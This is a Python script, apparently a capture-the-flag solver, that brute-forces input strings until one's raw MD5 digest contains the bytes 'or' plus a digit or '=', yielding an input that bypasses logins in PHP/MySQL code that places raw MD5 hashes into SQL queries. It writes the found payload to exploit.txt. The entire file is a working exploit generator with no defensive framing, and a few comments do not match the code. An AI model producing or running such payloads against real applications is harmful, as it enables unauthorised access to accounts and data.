import hashlib
import itertools
import string
import sys

def solve():
    print("Looking for a raw MD5 SQL injection vector...")
    
    # use digits + letters to cover the most common "password-like" strings
    chars = string.ascii_letters + string.digits + string.punctuation    
    # iterate through lengths 1 to 10 (or more)
    for length in range(1, 15):
        print(f"Checking length {length}...")
        
        # itertools.product generates ('a', 'a'), ('a', 'b'), etc.
        for p in itertools.product(chars, repeat=length):
            candidate = "".join(p)
            
            # compute raw MD5 hash
            # equivalent to PHP: md5($candidate, true)
            raw = hashlib.md5(candidate.encode('utf-8')).digest()
            
            # CHECK 1:  'or' injection
            # look for the sequence: 'or' followed by a digit (1-9)
            # creates: ... pw=''or'6... (which evaluates to True)
            if b"'or'" in raw:
                pos = raw.find(b"'or'")
                # ensure we have a char after 'or'
                if pos + 4 < len(raw):
                    # character after 'or' must be a non-zero digit 
                    # so MySQL interprets it as a True boolean.
                    # '1' is ASCII 49, '9' is ASCII 57
                    if 49 <= raw[pos + 4] <= 57:
                        print(f"\n[SUCCESS] Found 'or' injection!")
                        print(f"String: {candidate}")
                        print(f"Raw Hex: {raw.hex()}")
                        return candidate

            # CHECK 2: '=' injection 
            # look for: '=''
            # creates: ... pw=''=''... (Empty string equals empty string -> True)
            if b"'='" in raw:
                 print(f"\n[SUCCESS] Found '=' injection!")
                 print(f"String: {candidate}")
                 print(f"Raw Hex: {raw.hex()}")
                 return candidate

if __name__ == "__main__":
    result = solve()
    if result:
        with open("exploit.txt", "w") as f:
            f.write(f"Exploit:{result}")
        print(f"Exploit saved to exploit.txt")
    else:
        print("No solution found in the given range.")